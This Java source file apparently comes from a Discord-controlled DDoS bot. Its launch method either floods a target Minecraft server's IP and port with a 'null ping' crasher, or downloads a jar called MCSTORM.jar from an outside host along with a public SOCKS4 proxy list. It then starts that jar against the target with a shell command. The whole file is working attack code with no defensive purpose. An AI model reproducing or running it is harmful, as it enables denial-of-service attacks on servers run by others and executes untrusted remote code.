package neko.itskekoff.discordddosbot.manager.impl;

import com.diogonunes.jcolor.Command;
import neko.itskekoff.discordddosbot.Main;
import neko.itskekoff.discordddosbot.helpers.CommandExecutor;
import neko.itskekoff.discordddosbot.helpers.NullPing;
import neko.itskekoff.discordddosbot.manager.AttackManager;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.Objects;

public class run implements AttackManager {
    @Override
    public void launch(String ip, int time, String method) throws IOException, InterruptedException, URISyntaxException {
        System.out.println("Started!");
        //DdosModCrasher.launch(ip, time);
        if (method == "default") {
            NullPing.pingThreadCrasher(ip.split(":")[0], Integer.parseInt(ip.split(":")[1]), 100000, 120);
        } else {
            try {
                File dir = new File("./server/jars");
                if (!dir.exists()) {
                    dir.mkdirs();
                }
                File storm = new File("./server/jars/mcstorm.jar");
                if (storm.exists()) {
                    URL website2 = new URL("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt");
                    ReadableByteChannel rbcc = Channels.newChannel(website2.openStream());
                    FileOutputStream foss = new FileOutputStream("./proxies.txt");
                    foss.getChannel().transferFrom(rbcc, 0, Long.MAX_VALUE);
                    (new Thread(() -> {
                        try {
                            CommandExecutor.exec(String.format("start java -jar ./server/jars/mcstorm.jar %s %d %s %d %s", ip, 340, method, time, "-1"));
                        } catch (Exception ex) {
                            ex.printStackTrace();
                        }
                    })).start();
                }
                if (!storm.exists()) {
                    URL website = new URL("http://f0652346.xsph.ru/MCSTORM.jar");
                    ReadableByteChannel rbc = Channels.newChannel(website.openStream());
                    FileOutputStream fos = new FileOutputStream("./server/jars/mcstorm.jar");
                    fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
                    URL website2 = new URL("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt");
                    ReadableByteChannel rbcc = Channels.newChannel(website2.openStream());
                    FileOutputStream foss = new FileOutputStream("./proxies.txt");
                    foss.getChannel().transferFrom(rbcc, 0, Long.MAX_VALUE);
                    (new Thread(() -> {
                        try {
                            CommandExecutor.exec(String.format("start java -jar ./server/jars/mcstorm.jar %s %d %s %d %s", ip, 340, method, time, "-1"));
                        } catch (Exception ex) {
                            ex.printStackTrace();
                        }
                    })).start();
                }
            } catch (Exception ignored) {}
        }
    }
}
